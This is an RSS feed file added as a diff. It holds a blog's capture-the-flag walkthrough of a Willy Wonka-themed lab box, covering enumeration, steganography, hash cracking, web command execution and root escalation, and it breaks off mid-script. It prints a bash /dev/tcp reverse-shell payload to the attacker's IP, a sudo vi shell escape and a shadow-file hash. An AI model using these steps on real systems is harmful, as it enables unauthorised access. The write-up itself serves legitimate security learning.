@@ -1,0 +1,591 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>steganography on Jin&#39;s Exploit Repo</title>
+        <link>https://sudo-echo-jin.github.io/tags/steganography/</link>
+        <description>Recent content in steganography on Jin&#39;s Exploit Repo</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Sun, 25 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://sudo-echo-jin.github.io/tags/steganography/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Charlie and the Chocolate Factory</title>
+        <link>https://sudo-echo-jin.github.io/p/chocolate/</link>
+        <pubDate>Sun, 25 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://sudo-echo-jin.github.io/p/chocolate/</guid>
+        <description>&lt;img src="https://sudo-echo-jin.github.io/p/chocolate/cover.png" alt="Featured image of post Charlie and the Chocolate Factory" /&gt;&lt;p&gt;I enjoyed watching this movie when I was a kid. This box is made with the theme from the movie &lt;em&gt;Charlie and the Chocolate Factory&lt;/em&gt;. Thanks to &lt;a class=&#34;link&#34; href=&#34;https://andyinfosec.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;AndyInfosec&lt;/a&gt; team for creating this fun box and reminding me of a good old memories.&lt;/p&gt;
+&lt;p&gt;Now it&amp;rsquo;s time to take over the chocolate factory :)&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Target IP: 10.10.255.29&lt;/p&gt;
+&lt;p&gt;Starting with the port scanning.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a1.png&#34;
+	width=&#34;714&#34;
+	height=&#34;511&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;139&#34;
+		data-flex-basis=&#34;335px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ident&#34;&gt;IDENT&lt;/h2&gt;
+&lt;p&gt;We see many ports opened, and one of them, 113, runs &amp;ldquo;ident&amp;rdquo; protocol.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.warmupinbox.com/ident-protocol&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;What is ident?&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Modern day routers, even the cheap ones, they all contain the functionality to block this port. This port should not be allowed to people in general.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s see what information we can retrieve.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a2.png&#34;
+	width=&#34;650&#34;
+	height=&#34;134&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;485&#34;
+		data-flex-basis=&#34;1164px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From the nmap scan, we know that the target is running web server, so this might be useful later on when investigating the web.&lt;/p&gt;
+&lt;p&gt;Lets check other ports as well.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a3.png&#34;
+	width=&#34;679&#34;
+	height=&#34;340&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;199&#34;
+		data-flex-basis=&#34;479px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;This is what we got from the port 100. For those of you who forgot the characters in the movie, Mr. Wonka, or Willy Wonka, is the owner of the chocolate factory and Augustus is this &lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=lzmzZaB0kss&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;boy&lt;/a&gt;. All the other ports above 100 returns this message except the port 125.&lt;/p&gt;
+&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s see if this server allows anonymous access.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a5.png&#34;
+	width=&#34;407&#34;
+	height=&#34;255&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;383px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Yes it does.&lt;/p&gt;
+&lt;p&gt;List the content and download.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a6.png&#34;
+	width=&#34;927&#34;
+	height=&#34;290&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;319&#34;
+		data-flex-basis=&#34;767px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;There is a file called gum_room.jpg.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=FcqZynKuqhI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Gum room&lt;/a&gt;
+&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/gum_room.jpg&#34;
+	width=&#34;1920&#34;
+	height=&#34;1080&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;And this is the photo.&lt;/p&gt;
+&lt;p&gt;Investigate if anything is hidden in this jpg file.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;binwalk&lt;/li&gt;
+&lt;li&gt;strings&lt;/li&gt;
+&lt;li&gt;stegseek&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We got something from the stegseek.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a7.png&#34;
+	width=&#34;662&#34;
+	height=&#34;177&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;374&#34;
+		data-flex-basis=&#34;897px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Check out the content.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a8.png&#34;
+	width=&#34;793&#34;
+	height=&#34;746&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;106&#34;
+		data-flex-basis=&#34;255px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We got a base64 string. Run the following command below.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; cat gum_room.jpg.out &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &amp;gt; decrypted.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;And we got a shadow file that contains the Charlie&amp;rsquo;s password in sha512crypt hash.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--SNIPP--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;John comes into play. We don&amp;rsquo;t need to specify the format becaus JTR automatically recognizes it as sha512crypt.&lt;/p&gt;
+&lt;p&gt;Save the charlie&amp;rsquo;s shadow info in the file named &lt;em&gt;hash&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a9.png&#34;
+	width=&#34;950&#34;
+	height=&#34;106&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;896&#34;
+		data-flex-basis=&#34;2150px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Now we can bruteforce.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b1.png&#34;
+	width=&#34;935&#34;
+	height=&#34;268&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;348&#34;
+		data-flex-basis=&#34;837px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We got charlie&amp;rsquo;s password.&lt;/p&gt;
+&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Open the web browser and check the website.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/a4.png&#34;
+	width=&#34;794&#34;
+	height=&#34;697&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;113&#34;
+		data-flex-basis=&#34;273px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We got a web page with the login form.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s check what we got from IDENT port. (http://localhost/key_rev_key)&lt;/p&gt;
+&lt;p&gt;In the web browser, type &lt;code&gt;http://10.10.255.29/key_rev_key&lt;/code&gt; and we get a file called &lt;em&gt;key_rev_key&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b2.png&#34;
+	width=&#34;311&#34;
+	height=&#34;212&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;146&#34;
+		data-flex-basis=&#34;352px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;It is a ELF 64-bit file. Let&amp;rsquo;s run it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b3.png&#34;
+	width=&#34;303&#34;
+	height=&#34;102&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;297&#34;
+		data-flex-basis=&#34;712px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;It doesn&amp;rsquo;t like my name.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s do simple investigation on what libraries and functions this executable is calling.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b4.png&#34;
+	width=&#34;751&#34;
+	height=&#34;215&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;349&#34;
+		data-flex-basis=&#34;838px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Looks like this program is written in C and calls &amp;ldquo;printf&amp;rdquo;, &amp;ldquo;scanf&amp;rdquo;, &amp;ldquo;puts&amp;rdquo;, and &amp;ldquo;strcmp&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;It also leaks the string value that my name is being compared to. &lt;em&gt;laksdhfas&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s rerun it with the name &lt;em&gt;laksdhfas&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b5.png&#34;
+	width=&#34;921&#34;
+	height=&#34;140&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;657&#34;
+		data-flex-basis=&#34;1578px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We got a key, but don&amp;rsquo;t know yet where it&amp;rsquo;s gonna be used.&lt;/p&gt;
+&lt;h2 id=&#34;foothold--user-flag&#34;&gt;Foothold &amp;amp; User flag&lt;/h2&gt;
+&lt;p&gt;&amp;ldquo;While I was writing this post, machine time expired, so I restarted a machine and got new target IP: 10.10.124.206&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;We have charlie&amp;rsquo;s password from the FTP section. Let&amp;rsquo;s login.&lt;/p&gt;
+&lt;p&gt;Since the credential came from the shadow file, I thought it is obviously the ssh credential, but wasn&amp;rsquo;t true. One more place we could use this is the login form in the web.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b6.png&#34;
+	width=&#34;611&#34;
+	height=&#34;551&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;110&#34;
+		data-flex-basis=&#34;266px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b7.png&#34;
+	width=&#34;1880&#34;
+	height=&#34;988&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;190&#34;
+		data-flex-basis=&#34;456px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Login was successful and we are now in the &lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=dlkSbQ-IkRM&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;squirrel room&lt;/a&gt;. This room let us execute commands.&lt;/p&gt;
+&lt;p&gt;Setup a listener&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b8.png&#34;
+	width=&#34;423&#34;
+	height=&#34;97&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;436&#34;
+		data-flex-basis=&#34;1046px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Payload&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;/bin/bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.19.132/7777 0&amp;gt;&amp;amp;1&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/b9.png&#34;
+	width=&#34;362&#34;
+	height=&#34;141&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;256&#34;
+		data-flex-basis=&#34;616px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Execute it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c1.png&#34;
+	width=&#34;816&#34;
+	height=&#34;332&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;245&#34;
+		data-flex-basis=&#34;589px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;And we are in.&lt;/p&gt;
+&lt;h2 id=&#34;lateral-movement&#34;&gt;Lateral Movement&lt;/h2&gt;
+&lt;p&gt;Navigate to user charlie&amp;rsquo;s home directory and we see some interesting files.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c2.png&#34;
+	width=&#34;655&#34;
+	height=&#34;185&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;354&#34;
+		data-flex-basis=&#34;849px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c3.png&#34;
+	width=&#34;949&#34;
+	height=&#34;197&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;481&#34;
+		data-flex-basis=&#34;1156px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;The content of teleport.pub&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c4.png&#34;
+	width=&#34;687&#34;
+	height=&#34;611&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;112&#34;
+		data-flex-basis=&#34;269px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;The content of teleport&lt;/p&gt;
+&lt;p&gt;This is the ssh private key with the weak permission set.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s login to charlie&amp;rsquo;s account using this private key. Copy the key into a file named &amp;lsquo;id_rsa&amp;rsquo; and give it a 600 permission.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c5.png&#34;
+	width=&#34;688&#34;
+	height=&#34;685&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;100&#34;
+		data-flex-basis=&#34;241px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ssh -i id_rsa charlie@10.10.124.206&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c6.png&#34;
+	width=&#34;948&#34;
+	height=&#34;894&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;106&#34;
+		data-flex-basis=&#34;254px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We are now charlie.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/d5.png&#34;
+	width=&#34;671&#34;
+	height=&#34;53&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1266&#34;
+		data-flex-basis=&#34;3038px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We got a user flag.&lt;/p&gt;
+&lt;h2 id=&#34;privesc--root-flag&#34;&gt;Privesc &amp;amp; Root flag&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s first check if charlie has any sudo privilege.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c7.png&#34;
+	width=&#34;943&#34;
+	height=&#34;179&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;526&#34;
+		data-flex-basis=&#34;1264px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;This is going to be really simple privesc. We can run vi editor in root&amp;rsquo;s privilege without charlie&amp;rsquo;s password (good thing because we don&amp;rsquo;t know charlie&amp;rsquo;s password).&lt;/p&gt;
+&lt;p&gt;Execute &lt;code&gt;sudo /usr/bin/vi&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c8.png&#34;
+	width=&#34;493&#34;
+	height=&#34;55&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;896&#34;
+		data-flex-basis=&#34;2151px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/c9.png&#34;
+	width=&#34;959&#34;
+	height=&#34;546&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;175&#34;
+		data-flex-basis=&#34;421px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;And we are now in a default vi editor.&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;:!bash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/d1.png&#34;
+	width=&#34;555&#34;
+	height=&#34;424&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;130&#34;
+		data-flex-basis=&#34;314px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Enter&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/d2.png&#34;
+	width=&#34;565&#34;
+	height=&#34;144&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;392&#34;
+		data-flex-basis=&#34;941px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;We got root shell.&lt;/p&gt;
+&lt;p&gt;Navigate to the root&amp;rsquo;s home directory and instead of a flag, we see a python script called root.py.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/d3.png&#34;
+	width=&#34;368&#34;
+	height=&#34;53&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;694&#34;
+		data-flex-basis=&#34;1666px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;cryptography.fernet&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Fernet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pyfiglet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Enter the key:  &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fernet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;encrypted_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;dcrypt_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypted_mess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dcrypt_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;display1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyfiglet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;figlet_format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You Are Now The Owner Of &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;display2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyfiglet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;figlet_format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Chocolate Factory &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;display1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
